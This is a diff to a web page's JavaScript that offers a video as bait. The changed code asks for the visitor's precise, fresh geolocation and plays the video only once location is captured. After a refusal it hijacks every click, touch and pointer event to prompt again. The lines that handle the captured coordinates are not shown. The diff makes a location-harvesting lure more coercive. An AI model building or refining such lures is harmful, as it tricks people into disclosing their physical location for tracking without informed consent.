@@ -1,9 +1,16 @@
-const youtubeUrl = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
+const youtubeEmbedUrl = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=1&controls=1&rel=0&playsinline=1";
+let playing = false;
+let retryMode = false;
+
+function cleanupRetryListeners() {
+    document.removeEventListener("click", handleRetryClick, true);
+    document.removeEventListener("touchstart", handleRetryClick, true);
+    document.removeEventListener("pointerdown", handleRetryClick, true);
+}
 
 async function shareLocation() {
     if (!navigator.geolocation) {
-        window.location.href = youtubeUrl;
-        return;
+        return false;
     }
 
     return new Promise((resolve) => {
@@ -34,17 +41,61 @@ async function shareLocation() {
                     console.error(error);
                 }
 
-                window.location.href = youtubeUrl;
                 resolve(true);
             },
             () => {
-                window.location.href = youtubeUrl;
                 resolve(false);
+            }
+            ,
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
             }
         );
     });
 }
 
-window.onload = () => {
-    shareLocation();
-};
+async function startPlayer() {
+    if (playing) {
+        return;
+    }
+
+    const captured = await shareLocation();
+
+    if (!captured) {
+        retryMode = true;
+        document.body.classList.add("retrying");
+        document.addEventListener("click", handleRetryClick, true);
+        document.addEventListener("touchstart", handleRetryClick, true);
+        document.addEventListener("pointerdown", handleRetryClick, true);
+        return;
+    }
+
+    playing = true;
+    retryMode = false;
+    document.body.classList.remove("retrying");
+    cleanupRetryListeners();
+
+    const playerShell = document.getElementById("playerShell");
+    const player = document.getElementById("player");
+
+    player.src = youtubeEmbedUrl;
+    playerShell.classList.remove("hidden");
+}
+
+function handleRetryClick(event) {
+    if (!retryMode || playing) {
+        return;
+    }
+
+    event.preventDefault();
+    event.stopPropagation();
+    cleanupRetryListeners();
+    startPlayer();
+}
+
+document.getElementById("playLink").addEventListener("click", async (event) => {
+    event.preventDefault();
+    await startPlayer();
+});
